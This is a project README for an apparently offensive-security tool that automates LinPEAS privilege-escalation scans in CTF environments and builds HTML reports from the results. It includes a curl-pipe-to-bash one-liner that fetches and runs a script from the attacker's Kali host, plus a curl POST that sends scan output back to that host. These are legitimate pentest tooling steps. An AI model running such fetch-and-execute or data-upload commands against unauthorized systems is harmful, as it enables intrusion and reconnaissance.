# ParsingPeas 🥒

**Automated LinPEAS output collection and HTML report generation for CTF environments**

[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
[![Python 3.8+](https://img.shields.io/badge/python-3.8+-blue.svg)](https://www.python.org/downloads/)

Run one command on the target to automatically download LinPEAS from your Kali host, execute the scan, transfer results, and generate an interactive HTML report.

---

## Features

- **Zero manual file transfer** - Fully automated workflow
- **Works offline** - Target doesn't need internet access
- **Interactive HTML reports** - Categorized findings with color coding
- **Multi-session support** - Handle multiple concurrent scans
- **Non-interactive sudo patching** - Prevents scan hangs

---

## Quick Start

### On Kali Host

```bash
git clone https://github.com/YuvalMil/ParsingPeas.git
cd ParsingPeas
./setup.sh              # Downloads LinPEAS/WinPEAS
pip3 install -r requirements.txt
python3 receiver.py     # Starts on http://0.0.0.0:8000
```

### On Target Machine

```bash
curl -sSL http://YOUR_KALI_IP:8000/get-script | bash
```

### View Reports

Navigate to `http://YOUR_KALI_IP:8000` in your browser.

---

## How It Works

```
Target → Downloads script from Kali → Runs LinPEAS → POSTs output → Kali parses → HTML report
```

The target never needs internet - everything is served from your Kali host.

---

## Manual Usage

If the one-liner fails:

```bash
# On target
curl http://KALI_IP:8000/get-linpeas -o /tmp/lp.sh
chmod +x /tmp/lp.sh
/tmp/lp.sh > /tmp/out.txt

# Transfer
curl -X POST -H "X-Hostname: $(hostname)" -H "X-Scan-Type: linpeas" \
  --data-binary @/tmp/out.txt http://KALI_IP:8000/upload
```

**Parse local files:**
```bash
python3 parser.py /path/to/linpeas_output.txt
```

---

## Troubleshooting

**Can't download script?**
- Check connectivity: `curl http://KALI_IP:8000/health`
- Open firewall: `sudo ufw allow 8000/tcp`

**404 errors?**
- Run `./setup.sh` to download LinPEAS

**Scan hangs at sudo?**
- Update to latest: `git pull`

---

## Configuration

Edit `receiver.py` to change:
- Port (default: 8000)
- Output directories
- Max upload size (default: 500MB)

---

## Security

⚠️ **For authorized penetration testing only**

- No authentication - use in isolated environments
- Add firewall rules to restrict access
- Not for production use without hardening

---

## Credits

Built on [PEASS-ng](https://github.com/peass-ng/PEASS-ng) by [@carlospolop](https://github.com/carlospolop)

---

**MIT License** | Contributions welcome
